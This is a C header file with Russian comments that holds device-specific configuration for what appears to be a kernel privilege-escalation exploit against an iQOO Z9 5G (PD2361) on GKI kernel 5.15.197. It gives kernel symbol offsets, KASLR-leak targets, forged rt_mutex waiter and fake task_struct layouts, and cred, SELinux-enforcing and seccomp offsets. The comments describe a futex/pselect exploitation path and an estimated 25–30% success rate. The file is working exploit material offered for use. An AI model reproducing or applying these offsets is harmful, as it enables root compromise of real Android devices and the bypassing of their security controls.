#ifndef OFFSET_H
#define OFFSET_H

/* RMV port (PD2361 / iQOO Z9 5G China, kernel 5.15.197-android13-8-00049-
 * g7d37760ec777-ab15613975) — СТОКОВЫЙ сертифицированный GKI-билд
 * android13-5.15-2026-03_r12 (ci.android.com build 15613975), скачан с
 * dl.google.com (gki-certified-boot). Символы — kallsyms GKI Image.
 * Структурные оффсеты — из дизасма: remove_waiter читает waiter->lock@0x38,
 * pi_blocked_on = current+0x924 (совпадает с 6.1-compact). Остальные
 * task/cred-оффсеты от 6.1 — НЕ ПРОВЕРЕНЫ на этом ядре.
 *
 * ТРАНСПОРТ: pselect (MCAST-ветки в GKI 5.15 нет — 0x108-копии нет вовсе).
 * Геометрия: futex-цепочка 0xa0+0x140+0x1b0, waiter = fwrp sp+0x150 =>
 * waiter = E-0x240; core_sys_select (кадр 0x1c0) кладёт fd_set на sp+0x20 =>
 * слово0 fd_set = E-0xa0-0x1c0+0x20 = E-0x240 = waiter. WAITER_WORD_SHIFT=0.
 * Тот же механизм, что у рабочего 5.15-порта ankitrawatgit (pselect).
 *
 * СТАТУС: ЭКСПЕРИМЕНТАЛЬНЫЙ. На устройстве не проверялся; риск ребута
 * на промахе (kit: 25-30% попаданий).
 */

#define WAITER_COMPACT 1
#define WAITER_WORD_SHIFT 0

#define BUILD_VARIANT_LABEL "pd2361-z9cn-5.15.197-pselect"
#define BUILD_FINGERPRINT "iQOO/PD2361/V2361A (GKI 5.15.197-android13-8-00049-g7d37760ec777-ab15613975)"

/* ---- Memory layout ---- */
#define KIMAGE_TEXT_BASE             0xffffffc008000000ULL
#define P0_PAGE_OFFSET               0xffffff8000000000ULL
#define P0_PHYS_OFFSET               0x80000000ULL
#define P0_KERNEL_PHYS_LOAD          0xa8000000ULL
#define KERNELSNITCH_IDENTITY_START  0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END    0xffffff9000000000ULL
#define DIRECT_MAP_BASE              0xffffff8000000000ULL
#define DIRECT_MAP_END               0xffffff9000000000ULL
#define VMEMMAP_START                0xfffffffe00000000ULL

/* ---- Core kernel symbols (image-relative, kallsyms GKI 5.15.197) ---- */
#define ASHMEM_MISC_FOPS_OFF 0x02cb1e70ULL  /* ashmem_misc */
#define ASHMEM_FOPS_OFF 0x0211b488ULL
#define ASHMEM_IOCTL_OFF 0x0114b61cULL
#define ASHMEM_COMPAT_IOCTL_OFF 0x0114bcccULL
#define ASHMEM_MMAP_OFF 0x0114bd2cULL
#define ASHMEM_OPEN_OFF 0x0114c01cULL
#define ASHMEM_RELEASE_OFF 0x0114c0bcULL
#define ASHMEM_SHOW_FDINFO_OFF 0x0114c1e0ULL
#define CONFIGFS_READ_ITER_OFF 0x0067c5acULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x0067d0d0ULL
#define COPY_SPLICE_READ_OFF 0x005c9288ULL  /* generic_file_splice_read */
#define NOOP_LLSEEK_OFF 0x0055657cULL
#define INIT_TASK_OFF 0x02c63640ULL
#define ROOT_TASK_GROUP_OFF 0x02d78ac0ULL
#define INIT_CRED_OFF 0x02c1d688ULL
#define SELINUX_BLOB_SIZES_OFF 0x0217c730ULL
/* selinux_state.enforcing: enforcing bool@0 (CONFIG_SECURITY_SELINUX_DEVELOP). */
#define SELINUX_ENFORCING_OFF 0x02dcad88ULL
#define SECURITY_HOOK_HEADS_OFF 0x0217c750ULL
#define KMALLOC_CACHES_OFF 0x0217dbc0ULL
#define ANON_PIPE_BUF_OPS_OFF 0x01f9d7b0ULL

#define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define INIT_CRED (KIMAGE_TEXT_BASE + INIT_CRED_OFF)
#define SELINUX_BLOB_SIZES (KIMAGE_TEXT_BASE + SELINUX_BLOB_SIZES_OFF)
#define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define SECURITY_HOOK_HEADS (KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF)
#define KMALLOC_CACHES (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)

/* ---- SLIDE (KASLR leak) targets ---- */
#define SLIDE_NFULNL_LOGGER_OFF 0x02b21e30ULL
#define SLIDE_LOGGERS_0_1_OFF 0x02b21d80ULL  /* = LOGGER - 0xB0 */
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x02de6819ULL  /* sysctl_bootid */
#define SLIDE_NFULNL_LOG_PACKET_OFF 0x013bd2a0ULL
#define SLIDE_BOOTID_LEAK_SOURCE_OFF     (SLIDE_NFULNL_LOGGER_OFF + 0x10ULL)
#define SLIDE_BOOTID_LEAK_VALUE_OFF      SLIDE_NFULNL_LOG_PACKET_OFF
#define SLIDE_PROC_DO_UUID_OFF 0x00bc2230ULL
#define SLIDE_INIT_TASK_OFF 0x02c63640ULL
#define SLIDE_ROOT_TASK_GROUP_OFF 0x02d78ac0ULL
#define SLIDE_SYSCTL_BOOTID_OFF 0x02de6819ULL

#define SLIDE_NFULNL_LOGGER_IMAGE (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
#define SLIDE_LOGGERS_0_1_IMAGE (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

/* ---- Layout внутри kernel page ---- */
#define LOCK_OFF 0x1350
#define W0_OFF 0x2220
#define FOPS_OFF 0x1000
#define SCRATCH_OFF 0x3000
#define RIGHT_OFF 0x4440
#define LEFT_OFF 0x5550
#define FAKE_TASK_OFF 0x3200

/* ---- rt_mutex_waiter (5.15/6.1 compact, дизасм remove_waiter) ---- */
#define WAITER_LOCAL_OFF 0x80ULL
#define WAITER_TREE_ENTRY_OFF 0x0ULL
#define WAITER_PI_TREE_ENTRY_OFF 0x18ULL
#define WAITER_TASK_OFF 0x30ULL
#define WAITER_LOCK_OFF 0x38ULL
#define WAITER_WAKE_STATE_OFF 0x40ULL
#define WAITER_PRIO_OFF 0x44ULL
#define WAITER_DEADLINE_OFF 0x48ULL
#define WAITER_WW_CTX_OFF 0x50ULL

/* Forged waiter */
#define FAKE_WAITER_TREE_PRIO_OFF 0x18
#define FAKE_WAITER_TREE_DEADLINE_OFF 0x20
#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x18
#define FAKE_WAITER_PI_TREE_PRIO_OFF 0x44
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
#define FAKE_WAITER_TASK_OFF 0x30
#define FAKE_WAITER_LOCK_OFF 0x38
#define FAKE_WAITER_WAKE_STATE_OFF 0x40
#define FAKE_WAITER_WW_CTX_OFF 0x50

/* ---- Fake task_struct fields (pi_blocked_on=0x924 из дизасма 5.15;
 *      остальные — от 6.1, НЕ ПРОВЕРЕНЫ) ---- */
#define FAKE_TASK_USAGE_OFF 0x40ULL
#define FAKE_TASK_PRIO_OFF 0x84ULL
#define FAKE_TASK_NORMAL_PRIO_OFF 0x8cULL
#define FAKE_TASK_TASK_GROUP_OFF 0x340ULL
#define FAKE_TASK_PI_LOCK_OFF 0x924ULL
#define FAKE_TASK_PI_WAITERS_OFF 0x938ULL
#define FAKE_TASK_PI_TOP_TASK_OFF 0x948ULL
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x950ULL
#define FAKE_TASK_UCLAMP_REQ_OFF 0x350ULL
#define FAKE_TASK_UCLAMP_OFF 0x358ULL

/* ---- configfs buffer (CFG) offsets ---- */
#define CFG_PAGE_OFF 16
#define CFG_NEEDS_READ_FILL_OFF 80
#define CFG_BIN_BUFFER_OFF 88
#define CFG_BIN_BUFFER_SIZE_OFF 96
#define CFG_CB_MAX_SIZE_OFF 100

/* ---- task_struct field offsets (от 6.1, НЕ ПРОВЕРЕНЫ на 5.15) ---- */
#define MM_OWNER_OFF 0x298ULL
#define TASK_PID_OFF 0x6d8ULL
#define TASK_TGID_OFF 0x6dcULL
#define TASK_REAL_PARENT_OFF 0x688ULL
#define TASK_ATOMIC_FLAGS_OFF 0x638ULL
#define TASK_REAL_CRED_OFF 0x830ULL
#define TASK_CRED_OFF 0x838ULL
#define TASK_COMM_OFF 0x848ULL
#define TASK_TASKS_OFF 0x678ULL
#define TASK_THREAD_INFO_FLAGS_OFF 0x0ULL
#define TASK_SECCOMP_OFF 0xaa0ULL

/* vr.ko anti-root: нет — GKI-ядро, стадия выключается сама. */

/* ---- cred structure offsets (от 6.1, НЕ ПРОВЕРЕНЫ) ---- */
#define CRED_UID_OFF 0x8ULL
#define CRED_SECUREBITS_OFF 0x28ULL
#define CRED_CAPS_OFF 0x30ULL
#define CRED_SECURITY_OFF 0x80ULL
#define SELINUX_CRED_BLOB_OFF 0x0ULL
#define SELINUX_CRED_OSID_OFF  0
#define SELINUX_CRED_SID_OFF   4

/* ---- seccomp offsets ---- */
#define SECCOMP_MODE_OFF 0x0ULL
#define SECCOMP_FILTER_COUNT_OFF 0x4ULL
#define SECCOMP_FILTER_OFF 0x8ULL
#define TIF_SECCOMP_BIT           11
#define PFA_NO_NEW_PRIVS_BIT      0

/* ---- struct page / slab offsets ---- */
#define STRUCT_PAGE_SIZE              0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF         0x08
#define STRUCT_PAGE_TYPE_OFF          0x30

/* ---- pipe_buffer offsets ---- */
#define PIPE_BUFFER_SIZE      0x28
#define PIPE_BUFFER_SLOTS     32
#define PIPE_BUF_FLAG_CAN_MERGE 0x10

/* ---- struct file_operations slot offsets ---- */
#define FOPS_OWNER_OFF 0x0
#define FOPS_LLSEEK_OFF 0x08
#define FOPS_READ_OFF 0x10
#define FOPS_WRITE_OFF 0x18
#define FOPS_READ_ITER_OFF 0x20
#define FOPS_WRITE_ITER_OFF 0x28
#define FOPS_IOCTL_OFF 0x48
#define FOPS_COMPAT_IOCTL_OFF 0x50
#define FOPS_MMAP_OFF 0x58
#define FOPS_OPEN_OFF 0x70
#define FOPS_RELEASE_OFF 0x80
#define FOPS_SPLICE_READ_OFF 0xc8
#define FOPS_SHOW_FDINFO_OFF 0xe0

#endif /* OFFSET_H */
